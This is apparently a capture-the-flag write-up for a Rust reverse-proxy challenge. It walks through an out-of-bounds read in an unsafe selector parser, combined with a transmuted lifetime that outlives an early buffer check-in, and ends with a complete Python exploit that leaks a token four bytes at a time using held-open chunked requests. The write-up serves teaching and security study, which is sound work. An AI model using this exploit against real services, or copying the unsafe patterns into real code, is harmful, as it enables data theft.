# System Architecture

Gateway is the external entrypoint. Vault only listens on `127.0.0.1:3005` inside the container, making it inaccessible from the external network. Vault is an Axum HTTP service, and its critical internal endpoint is:

```
GET /internal/compliance/export-snapshot
```

Calling it returns a simulated daily cash reconciliation report. The source code actually returns a minified JSON without whitespace, which is 451 bytes long when using the default token. The token is hidden in the `reconciliation_token` field, starting at offset 402 at the very end of the JSON. For readability, the formatted JSON is shown below:

```json
{
  "portfolio": "northwind-capital",
  "report": "daily-cash-reconciliation",
  "generated_at": "2026-06-02T09:30:00+08:00",
  "positions": [
    { "desk": "treasury-ops", "currency": "USD", "notional": 18420000 },
    { "desk": "fx-liquidity", "currency": "EUR", "notional": 7200000 },
    { "desk": "settlement", "currency": "JPY", "notional": 930000000 }
  ],
  "controls": {
    "source": "custody-ledger",
    "approval": "two-person-review"
  },
  "reconciliation_token": "SCTF{...}"
}
```

The service itself lacks authentication but does not listen externally, so this endpoint cannot be requested directly.

Gateway is a reverse proxy based on Hyper, listening on `0.0.0.0:8080`. It has three main features:

**Reverse Proxy**

The gateway forwards requests matching the routing table to the corresponding backend service (including vault). The routing table is configured in `gateway.toml`. Requests with the `/api` prefix are proxied to `http://127.0.0.1:3005`. For instance, `/api/status` can successfully reach vault. However, the gateway does not strip the `/api` prefix when forwarding, so a request to `/api/internal/compliance/export-snapshot` is forwarded as `/api/internal/compliance/export-snapshot`, which does not exist on vault. Thus, the internal export report cannot be directly retrieved.

**Background Refresh Task**

When the gateway starts, it spawns a background tokio task that requests vault's `/internal/compliance/export-snapshot` every 1 second. After receiving the response, it writes the body into all checked-in buffers in the scratch buffer pool. This is how sensitive data enters the memory of the gateway process.

The background task is initialized in `SelectorEngine::new`:

```rust
// gateway/src/selector.rs
if let Some(url) = snapshot_url {
    let engine = engine.clone();
    tokio::spawn(async move {
        loop {
            if let Ok(body) = fetch_http_body(&url).await {
                engine.store_snapshot(&body);
            }
            sleep(refresh_interval).await;
        }
    });
}
```

`store_snapshot` iterates over all buffers in each tenant pool, clears them, and copies the report content:

```rust
fn store_snapshot(&self, body: &[u8]) {
    let snapshot = body[..body.len().min(SCRATCH_CAP)].to_vec();
    let mut pools = self.pools.lock().expect("selector pool lock poisoned");
    for pool in pools.values_mut() {
        for scratch in pool.iter_mut() {
            scratch.fill(0);
            scratch[..snapshot.len()].copy_from_slice(&snapshot);
        }
    }
}
```

Note the logic here: if a buffer is currently checked out (in use by a request), it is not in the pool and will not be overwritten. Only checked-in buffers will be updated with the refresh data.

**Route Audit Endpoint**

```
POST /__route/audit
```

This is the only debug endpoint that can be called externally. The request must include the `X-Route-Selector` header. The body content itself is not parsed, but the gateway waits for the body to end before returning the audit result, so the timing of the body's end is crucial. The gateway parses the route selector in the header and returns a JSON response:

```json
{ "tenant": "...", "path": "...", "nonce_preview_hex": "..." }
```

`nonce_preview_hex` is the hexadecimal representation of the parsed nonce field. The vulnerability lies here: it can contain memory content beyond the header.

# Out-of-Bounds Read in Unsafe Zero-Copy Parser

To avoid memory allocation per request, the gateway uses a reusable scratch buffer pool. The pool structure is:

```rust
const SCRATCH_CAP: usize = 512;
type Scratch = Box<[u8; SCRATCH_CAP]>;
type TenantPools = HashMap<String, Vec<Scratch>>;
```

Buffers are sharded by tenant (the part before the first colon in the selector). Each tenant has a `Vec<Scratch>` pool. When a request arrives, a 512-byte buffer is checked out, used, and then checked back in. If the pool is empty, a new one is allocated via `Box::new([0_u8; 512])`.

Each checked-out buffer is cleared with `scratch.fill(0)`, so normally there is no data leakage between requests—as long as the buffer is used strictly within its lifetime.

The expected format of the `X-Route-Selector` header has three colon-separated parts:

```
tenant:path:nonce
```

For example: `northwind-capital:/ops/route-diagnostics:a1b2c3d4`

The parser splits these three parts: tenant is the first segment, path is the middle segment, and nonce is the final segment. The parsed tenant is also used as the shard key for the pool.

The core parsing logic is located in `gateway/src/selector.rs:129-160`:

```rust
unsafe fn parse_route_selector(raw: &[u8], scratch_cap: usize) -> ParsedSelector<'_> {
    // Find the first colon
    let first = memchr::memchr(b':', raw).unwrap_or(raw.len());

    // Find the second colon (searching from the byte after the first colon)
    let second = if first < raw.len() {
        memchr::memchr(b':', &raw[first + 1..])
            .map(|index| index + first + 1)
            .unwrap_or(raw.len())  // If no second colon is found, second = raw.len()
    } else {
        raw.len()
    };

    // Calculate the start position of nonce
    let tenant_end = first.min(raw.len());
    let path_start = first.saturating_add(1).min(raw.len());
    let path_end = second.min(raw.len());
    let nonce_start = second.saturating_add(1);
    //                                     ↑ When second == raw.len(),
    //                                     nonce_start = raw.len() + 1, which is out of bounds

    // Calculate nonce length
    let nonce_len = scratch_cap.saturating_sub(nonce_start).min(NONCE_PREVIEW_BYTES);
    //             ^^^^^^^^^^  Uses the scratch buffer's total capacity (512) for calculation

    // Construct slices
    let tenant = unsafe { std::str::from_utf8_unchecked(&raw[..tenant_end]) };
    let path = unsafe { std::str::from_utf8_unchecked(&raw[path_start..path_end]) };
    let nonce = if nonce_len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(raw.as_ptr().add(nonce_start), nonce_len) }
    };
    //                                         ↑ Raw pointer addition, unprotected by slice boundary checks.
    //                                         Triggers an out-of-bounds read when nonce_start > raw.len()

    ParsedSelector { tenant, path, nonce }
}
```

Normal case: header is `northwind-capital:/ops/route-diagnostics:a1b2c3d4`

- `first = 17` (position of the first `:`)
- `second = 40` (position of the second `:`)
- `nonce_start = 41` (within `raw`, where `raw.len()` is 49)
- `nonce_len = 512 - 41 = 471`, capped to 4 by `.min(4)`
- The nonce reads the first 4 bytes of `a1b2c3d4`.

Abnormal case: header contains only one colon, e.g., `northwind-capital:/ops/route-diagnostics`

- `first = 17`
- No second colon is found, so `second = raw.len()` = 40.
- `nonce_start = 40 + 1 = 41`, which exceeds the actual header length of 40.
- However, `nonce_len = 512 - 41 = 471`, capped to 4 by `.min(4)`.
- `nonce` becomes a 4-byte slice starting at `raw.as_ptr() + 41`, pointing to memory after the header data.

```
Scratch Buffer (512 bytes)
┌──────────────────────────────────────────────────────────────────────────────┐
│ northwind-capital:/ops/route-diagnostics │ 00 00 00 00 00 00 00 ...          │
│ ← ← ← ← ← header is about 40 bytes → → →│ ← ← nonce slice points here → →   │
└──────────────────────────────────────────────────────────────────────────────┘
                                           ↑
                                     nonce_start = 41
                                     raw is logically only 40 bytes long,
                                     but raw pointer addition bypasses this limit.
```

This does not read arbitrary heap memory. Because the header is copied into the 512-byte scratch buffer, the out-of-bounds slice still points to a subsequent position within the same buffer. The parsing stage only constructs this slice. The actual encoding of the slice into `nonce_preview_hex` occurs later in `finish()`. If the background refresh task overwrites this buffer with the compliance report in the meantime, the slice will read the report content.

# Transmute and Cross-Await Borrow

An out-of-bounds read alone is insufficient because each checkout clears the buffer with `scratch.fill(0)`, meaning everything after the header is zero. To make the OOB read capture meaningful data, it must be combined with an async lifetime bug.

The core flow of `defer_trace` is in `gateway/src/selector.rs:67-87`:

```rust
pub fn defer_trace(&self, raw_header: &[u8]) -> DeferredTrace {
    let tenant_key = tenant_key(raw_header);

    // Check out a buffer from the pool, clear it, and copy the header
    let mut scratch = self.checkout(&tenant_key);
    let raw_len = raw_header.len().min(SCRATCH_CAP);
    scratch[..raw_len].copy_from_slice(&raw_header[..raw_len]);

    // Perform zero-copy parsing on the buffer
    let (tenant, path, nonce) = {
        let raw = &scratch[..raw_len];
        let parsed = unsafe { parse_route_selector(raw, SCRATCH_CAP) };

        // Cast the lifetime of the nonce slice from &'_ [u8] to &'static [u8]
        let nonce = unsafe {
            std::mem::transmute::<&[u8], &'static [u8]>(parsed.nonce)
        };

        // Copy tenant and path into owned Strings, while retaining the &'static reference to nonce
        (parsed.tenant.to_string(), parsed.path.to_string(), nonce)
    };

    // Return the buffer early
    self.checkin(tenant_key, scratch);

    // The returned DeferredTrace holds a 'static reference to the already checked-in buffer
    DeferredTrace { tenant, path, nonce }
}
```

Now look at the caller `route_audit` (`gateway/src/gateway.rs:126-148`):

```rust
async fn route_audit(&self, request: Request<Incoming>) -> Result<Response<ResponseBody>, BoxedError> {
    let Some(selector) = request.headers().get("x-route-selector") else {
        /* 400 */
    };

    // Parse the selector; the buffer is checked in inside this function
    let trace = self.selector.defer_trace(selector.as_bytes());

    // There is an .await here while the buffer has already been checked back in.
    // But the nonce inside trace still points to it.
    // If the background refresh runs during this period, the buffer content changes.
    request.into_body().collect().await?;

    // Now we read the nonce, at which point the buffer might have been overwritten by refresh.
    let trace = trace.finish();
    /* Returns nonce_preview_hex */
}
```

`.await` yields execution control, allowing the Tokio scheduler to run the refresh task. Since the refresh runs once every second, we can reliably trigger it by ensuring that the `.await` lasts longer than one refresh cycle.

We can use HTTP chunked transfer encoding to control this time window: send the headers first, but hold off on sending the final chunk. This keeps the server waiting at `.await` for over 1 second (ensuring at least one refresh has run) before terminating the body.

Normal requests (without a slow body) also check in the buffer and then `.await`, but the body is small enough that `collect().await` finishes almost instantly. Thus, it usually does not cross a refresh boundary, reading only the zeroes from checkout. Even if it occasionally does, it only yields 4 bytes at a single offset, making it impossible to assemble the full token with one request.

# Exploitation

Two constraints dictate how we exploit this:

1. **Only 4 bytes can be retrieved per request**. The audit endpoint only returns a short nonce preview. `NONCE_PREVIEW_BYTES` is fixed at 4, and `nonce_len` is truncated by `.min(4)`.
2. **The compliance JSON is 451 bytes, and the token is at the end**. The default token starts at offset 402. If `nonce_start` is near the beginning of the buffer (e.g., offset 51), the leaked 4 bytes will be data near the start of the JSON, which is over 300 bytes away from the token.

Controlling `nonce_start` is straightforward. Recall that when the header has only one colon, `second = raw.len()`, which means:

```
nonce_start = second + 1 = raw.len() + 1 = entire header length + 1
```

In other words, `nonce_start` is entirely determined by the length of the header. Increasing the header length shifts `nonce_start` backward, sliding the 4-byte leak window along with it.

The exploit constructs headers of varying lengths using a prefix combined with variable-length padding:

```
Prefix: northwind-capital-<random>:/ops/route-diagnostics/
        ↑ 50 bytes

Add 0 'A's   → header length = 50  → nonce_start = 51
Add 1 'A'    → header length = 51  → nonce_start = 52
Add 2 'A's   → header length = 52  → nonce_start = 53
...
Add 351 'A's → header length = 401 → nonce_start = 402
```

Each time `nonce_start` shifts by 1 byte, the 4-byte leak window also shifts by 1 byte. Two adjacent windows overlap by 3 bytes.

```
Scratch Buffer (512 bytes)
┌──────────────────────────────────────────────────────────────────────────────┐
│ Compliance JSON (451 bytes)                                                  │
│ ┌─── portfolio, positions, etc. ───┬──── reconciliation_token ────┬── Rest ──┐│
│                                    │    SCTF{...}                 │          ││
└──────────────────────────────────────────────────────────────────────────────┘
                                     ↑
                          The 4-byte window needs to slide here

pad_len = 0:    [4B]   Starts at offset 51, not yet in the token region
pad_len = 150:            [4B]   Somewhere near positions / controls
...
pad_len = 351:                                        [4B][4B][4B]...
                                                              ↑ Stitched together
```

Each request yields a 4-byte nonce. Since adjacent padding lengths differ by 1, adjacent windows overlap by 3 bytes. We stitch them by taking the first byte of each chunk, and finally appending the remaining 3 bytes of the last chunk:

```
chunk[0]: [a0 a1 a2 a3]
chunk[1]:    [b1 b2 b3 b4]    ← offset difference is 1, so b1 is next to a0
chunk[2]:       [c2 c3 c4 c5]
...

Stitched Result: a0 b1 c2 d3 e4 f5 ...
                 ↑  ↑  ↑  First byte of each chunk
                           Appended with chunk[-1][1:4] at the end
```

This reconstructs a continuous block of memory starting from offset 51 of the scratch buffer. We can then match the token using the regex `SCTF\{[^}]+\}`.

**Exploit Explanation**

```python
import json
import os
import re
import socket
import time
from urllib.parse import urlparse

BASE = "http://127.0.0.1:8080"
URL = urlparse(BASE)
HOST = URL.hostname or "127.0.0.1"
PORT = URL.port or 80
TENANT = "northwind-capital-" + os.urandom(4).hex()
PREFIX = TENANT + ":/ops/route-diagnostics/"
SCAN = 430
BATCH = 16
HOLD = 1.3
```

Slow body request:

```python
def open_leak(selector):
    s = socket.create_connection((HOST, PORT), timeout=5)
    req = (
        "POST /__route/audit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"X-Route-Selector: {selector}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    s.sendall(req.encode())
    return s
```

Use raw socket to send the HTTP request, declaring `Transfer-Encoding: chunked` but not sending the final chunk `0\r\n\r\n` immediately. The server receives the headers and begins processing—parsing the selector, checking in the buffer, and entering `.await` while waiting for the body. The socket remains open, waiting for the rest of the data.

Triggering refresh and receiving data:

```python
def finish_leak(s):
    s.sendall(b"0\r\n\r\n")    # End chunked body
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    body = data.split(b"\r\n\r\n", 1)[1]
    return bytes.fromhex(json.loads(body)["nonce_preview_hex"])
```

Sending `0\r\n\r\n` notifies the server that the body has ended. `collect().await` returns, and the gateway executes `trace.finish()`, which reads the nonce slice (now containing the refreshed content) and returns it. The client parses the JSON and decodes `nonce_preview_hex` to get the raw 4 bytes.

Main loop:

```python
chunks = []
for start in range(0, SCAN, BATCH):
    # Open connections concurrently, send headers but do not end body
    sockets = [
        open_leak(PREFIX + ("A" * pad_len))
        for pad_len in range(start, min(start + BATCH, SCAN))
    ]

    # Sleep for 1.3s to allow the refresh task to run
    time.sleep(HOLD)

    # End body and collect response
    chunks += [finish_leak(s) for s in sockets]
```

Batching 16 concurrent requests makes the scanning process much faster. Also, requests within the same batch are highly likely to retrieve data from the same refresh cycle, ensuring consistency.

Stitching and searching:

```python
stitched = bytearray()
for chunk in chunks:
    stitched += chunk[:1]      # Take the first byte of each chunk
stitched += chunks[-1][1:]     # Append the last 3 bytes of the last chunk

marker = re.search(rb"SCTF\{[^}]+\}", stitched)
if marker:
    print(marker.group().decode())
```

Since the padding lengths differ by 1, the 4-byte window slides 1 byte at a time. The offsets below are relative to the scanning start (which corresponds to absolute offset 51 in the scratch buffer):

- `chunk[0]` covers relative offsets `0..4` (scratch offset `51..55`)
- `chunk[1]` covers relative offsets `1..5` (scratch offset `52..56`)
- `chunk[2]` covers relative offsets `2..6` (scratch offset `53..57`)

Each chunk's first byte (`chunk[:1]`) represents the newly covered byte. Finally, appending `chunks[-1][1:]` adds the remaining 3 bytes. The stitched result has a length of `SCAN + NONCE_PREVIEW_BYTES - 1 = 433` bytes, covering scratch buffer offsets `51..484`.
